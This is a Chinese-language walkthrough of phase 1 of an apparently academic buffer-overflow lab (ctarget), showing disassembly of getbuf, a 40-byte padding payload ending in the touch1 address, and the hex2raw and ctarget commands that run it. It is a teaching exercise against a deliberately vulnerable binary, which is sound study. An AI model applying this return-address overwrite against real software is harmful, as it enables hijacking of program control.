首先反汇编可执行程序，生成汇编代码。
objdump -d ctarget > ctarget.d
这一关的任务是从test函数跳转到touch1

test如下：

void test() {
      int val;
      val = getbuf();
      printf("No exploit. Getbuf returned 0x%x\n", val);
}

汇编如下：
0000000000401968 <test>:
  401968:       48 83 ec 08             sub    $0x8,%rsp
  40196c:       b8 00 00 00 00          mov    $0x0,%eax
  401971:       e8 32 fe ff ff          callq  4017a8 <getbuf>
  401976:       89 c2                   mov    %eax,%edx
  401978:       be 88 31 40 00          mov    $0x403188,%esi
  40197d:       bf 01 00 00 00          mov    $0x1,%edi
  401982:       b8 00 00 00 00          mov    $0x0,%eax
  401987:       e8 64 f4 ff ff          callq  400df0 <__printf_chk@plt>
  40198c:       48 83 c4 08             add    $0x8,%rsp
  401990:       c3                      retq

00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             sub    $0x28,%rsp // 40 bytes
  4017ac:       48 89 e7                mov    %rsp,%rdi
  4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
  4017b9:       48 83 c4 28             add    $0x28,%rsp
  4017bd:       c3                      retq
可以看到这里把 %rsp 移动了 0x28(40) 位，也就是说，我们的缓冲区有 40 位，再上面的四位就是原来正常需要返回到 
test 的返回地址（注意看之前的栈帧图），我们要做的就是利用缓冲区溢出把这个返回地址改掉。

00000000004017c0 <touch1>:

p164 stack frame
注意写汇编时的大小端问题！！！直接看代码就可以看出是小端。
4017ce:   bf c5 30 40 00          mov    $0x4030c5,%edi

或者使用gdb调试一下：
b设置断点，r为运行，加参数-q是因为实验为本地实验，不提交。


(五)查看内存的值(x)：
(1)使用x命令来查看内存地址中的值。
(2)格式：x/<n/f/u> <addr>。n,f,u是可选的参数。
*n：是一个正整数，表示显示内存的长度。
*f：表示显示格式。
*u：表示当前地址往后请求的字节数。
*addr：表示一个内存地址。

(gdb) x/40xw $rsp


vi phase1.txt
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
c0 17 40 00
00000000004017c0 <touch1>:

接着我们把这个字符文件转换成字节码 ./hex2raw < phase1.txt > phase1bc.txt，
最后执行一下 ./ctarget -i phase1bc.txt，就可以看到结果了
cat phase1.txt | ./hex2raw | ./ctarget -q



